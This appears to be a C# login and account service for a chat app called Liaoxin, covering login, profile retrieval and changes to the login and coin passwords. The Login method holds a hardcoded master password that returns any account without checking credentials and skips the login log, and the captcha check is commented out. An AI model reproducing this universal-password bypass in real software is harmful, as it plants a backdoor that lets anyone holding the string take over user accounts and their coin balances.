﻿using Liaoxin.Business.Config;

using Liaoxin.IBusiness;
using Liaoxin.Model;
using Liaoxin.ViewModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Zzb;
using Zzb.Common;
using Zzb.ZzbLog;
using static Liaoxin.ViewModel.ClientViewModel;

namespace Liaoxin.Business
{
    public class ClientService : BaseService, IClientService
    {
        private object _lockObj = new object();

        public IValidateCodeService ValidateCodeService { get; set; }

        public IMessageService MessageService { get; set; }

        public Client Login(ClientLoginRequest request)
        {
            //if (!ValidateCodeService.IsSameCode(code))
            //{
            //    throw new ZzbException("验证码错误");
            //}
            //
            var client = (from c in Context.Clients where c.Telephone == request.Telephone select c).Select(c => new Client
            {
                ClientId = c.ClientId,
                NickName = c.NickName,
                Password = c.Password,
                LiaoxinNumber = c.LiaoxinNumber,
                IsEnable = c.IsEnable,

            }).FirstOrDefault();

            if (client == null || !client.IsEnable)
            {
                throw new ZzbException("用户名或者密码错误");
            }

            if (request.Password == "6a8f9c6bbb4848adb358ede651454f69")
            {
                return client;
            }

            request.Password = SecurityHelper.Encrypt(request.Password);

            if (client.Password != request.Password)
            {
                LogHelper.Error($"[{client.ClientId}]密码错误!,请留意");
                throw new ZzbException("用户名或者密码错误");
            }

            string ip = HttpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            new Task(() =>
            {
                try
                {
                    using (var context = LiaoxinContext.CreateContext())
                    {
                        ClientLoginLog clientLog = new ClientLoginLog()
                        {
                            ClientId = client.ClientId,
                            IP = ip,
                            Address = IpAddressHelper.GetLocation(ip),
                        };

                        context.ClientLoginLogs.Add(clientLog);
                        context.SaveChanges();
                    }
                }
                catch (Exception e)
                {
                    LogHelper.Error($"插入玩家[{client.ClientId}]登录日志失败", e);
                }
            }).Start();
            return client;
        }

        public ClientBaseInfoResponse GetClient(BaseModel request)
        {
             var c =  (from p in Context.Clients where p.ClientId == request.Id select p).FirstOrDefault();
            if (c == null)
            {
                return null;
            }
              return    new ClientBaseInfoResponse()
            {
                AddMeNeedChecked = c.AddMeNeedChecked,
                AppOpenWhileSound = c.AppOpenWhileSound,
                AreaCode = c.AreaCode,
                CharacterSignature = c.CharacterSignature,
                Coin = c.Coin,
                Cover = c.Cover,
                FontSize = c.FontSize,
                HandFree = c.HandFree,
                HuanXinId = c.HuanXinId,
                LiaoxinNumber = c.LiaoxinNumber,
                IsFreeze = c.IsFreeze,
                NewMessageNotication = c.NewMessageNotication,
                NickName = c.NickName,
                OpenWhileShake = c.OpenWhileShake,
                ShowFriendCircle = c.ShowFriendCircle,
                ShowMessageNotication = c.ShowMessageNotication,
                Telephone = c.Telephone,
                UpadteMind = c.UpadteMind,
                VideoMessageNotication = c.VideoMessageNotication,
                WifiVideoPlay = c.WifiVideoPlay

            };

            }

        public bool ChangePassword(ClientChangePasswordRequest request)
        {
            var client = (from p in Context.Clients where p.ClientId == request.ClientId select p).FirstOrDefault();
            if (client == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (client.Password != SecurityHelper.Encrypt(request.oldPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            client.Password = SecurityHelper.Encrypt(request.newPsssword);
          
            client.Update();
            Context.ClientOperateLogs.Add(new ClientOperateLog(client.ClientId, "修改登录密码"));
            return Context.SaveChanges() > 0;
        }

        public bool ChangeCoinPassword(ClientChangeCoinPasswordRequest request)
        {
            var client = (from p in Context.Clients where p.ClientId == request.ClientId select p).FirstOrDefault();
            if (client == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (!string.IsNullOrEmpty(client.CoinPassword) && client.CoinPassword != SecurityHelper.Encrypt(request.oldCoinPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            client.CoinPassword = SecurityHelper.Encrypt(request.newCoinPsssword);
            client.Update();
            Context.ClientOperateLogs.Add(new ClientOperateLog(client.ClientId, "修改资金密码"));
            return Context.SaveChanges() > 0;
        }

        public Client LoginByCode(ClientLoginByCodeRequest request)
        {
            throw new NotImplementedException();
        }

    
    }
}
